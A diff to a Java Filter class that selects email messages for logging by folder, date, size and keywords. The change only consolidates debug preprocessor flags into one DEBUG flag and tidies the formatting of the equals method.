@@ -151,7 +151,7 @@ public class Filter {
                 //#endif
             }
 
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             debug.trace("classname: " + classString);
             //#endif
 
@@ -167,7 +167,7 @@ public class Filter {
             if (doFilterFromDate) {
                 final DateTime dt = new DateTime(filetimeFromDate);
                 fromDate = dt.getDate();
-                //#ifdef DEBUG_TRACE
+                //#ifdef DEBUG
                 debug.trace("from: " + fromDate.toString());
                 //#endif
             } else {
@@ -176,13 +176,13 @@ public class Filter {
             if (doFilterToDate) {
                 final DateTime dt = new DateTime(filetimeToDate);
                 toDate = dt.getDate();
-                //#ifdef DEBUG_TRACE
+                //#ifdef DEBUG
                 debug.trace("to: " + toDate.toString());
                 //#endif
             } else {
                 toDate = new Date(Integer.MAX_VALUE);
             }
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             debug.trace("maxMessageSize: " + maxMessageSize);
             debug.trace("maxMessageSizeToLog: " + maxMessageSizeToLog);
             //#endif
@@ -192,7 +192,7 @@ public class Filter {
             valid = true;
         } catch (final EOFException e) {
             valid = false;
-            //#ifdef DEBUG_ERROR
+            //#ifdef DEBUG
             debug.error("filter:" + e);
             //#endif
         }
@@ -215,7 +215,7 @@ public class Filter {
                         keywordPrefix.length, false);
                 keywordOffset += keywordPrefix.length + Prefix.LEN;
 
-                //#ifdef DEBUG_INFO
+                //#ifdef DEBUG
                 debug.info("Keyword: " + keyword);
                 //#endif
                 keywords.addElement(keyword);
@@ -245,13 +245,13 @@ public class Filter {
         long receivedTime;
 
         if (!enabled) {
-            //#ifdef DEBUG_INFO
+            //#ifdef DEBUG
             debug.info("Disabled");
             //#endif            
             return FILTERED_DISABLED;
         }
 
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("filterMessage: " + message.getMessageId());
         //#endif
 
@@ -267,7 +267,7 @@ public class Filter {
 
         final Folder folder = message.getFolder();
 
-        //#ifdef DEBUG_INFO
+        //#ifdef DEBUG
         String foldername = "NO_FOLDER";
         int foldertype = -1;
         //#endif
@@ -283,14 +283,14 @@ public class Filter {
                     break;
                 }
             }
-            //#ifdef DEBUG_INFO
+            //#ifdef DEBUG
             foldername = folder.getName();
             foldertype = folder.getType();
             //#endif
         }
 
         if (!found) {
-            //#ifdef DEBUG_INFO
+            //#ifdef DEBUG
             debug.info("filterMessage: FILTERED_NOTFOUND: " + foldername
                     + " type: " + foldertype);
             //#endif
@@ -299,7 +299,7 @@ public class Filter {
 
         receivedTime = message.getReceivedDate().getTime();
         if (lastcheck != 0 && receivedTime < lastcheck) {
-            //#ifdef DEBUG_INFO
+            //#ifdef DEBUG
             debug.info("receivedTime < lastcheck :" + receivedTime + " < "
                     + lastcheck);
             //#endif
@@ -308,7 +308,7 @@ public class Filter {
 
         // se c'e' il filtro from e non viene rispettato escludi la mail
         if (doFilterFromDate == true && receivedTime < fromDate.getTime()) {
-            //#ifdef DEBUG_INFO
+            //#ifdef DEBUG
             debug.info("doFilterFromDate: " + fromDate);
             //#endif
             return FILTERED_DATEFROM;
@@ -317,7 +317,7 @@ public class Filter {
         // Se c'e' anche il filtro della data di fine e non viene rispettato
         // escludi la mail
         if (doFilterToDate == true && receivedTime > toDate.getTime()) {
-            //#ifdef DEBUG_INFO
+            //#ifdef DEBUG
             debug.info("doFilterToDate: " + toDate);
             //#endif
             return FILTERED_DATETO;
@@ -325,7 +325,7 @@ public class Filter {
 
         if ((maxMessageSizeToLog > 0)
                 && (message.getSize() > maxMessageSizeToLog)) {
-            //#ifdef DEBUG_INFO
+            //#ifdef DEBUG
             debug.info("maxMessageSizeToLog: " + maxMessageSizeToLog);
             //#endif
             return FILTERED_SIZE;
@@ -353,13 +353,13 @@ public class Filter {
         if (obj == null) {
             return false;
         }
-        
-        if(! (obj instanceof Filter )){
+
+        if (!(obj instanceof Filter)) {
             return false;
         }
-        
-        Filter filter = (Filter) obj;
-        
+
+        final Filter filter = (Filter) obj;
+
         ret &= filter.doFilterFromDate == doFilterFromDate;
         ret &= filter.doFilterToDate == doFilterToDate;
         ret &= filter.fromDate == fromDate;
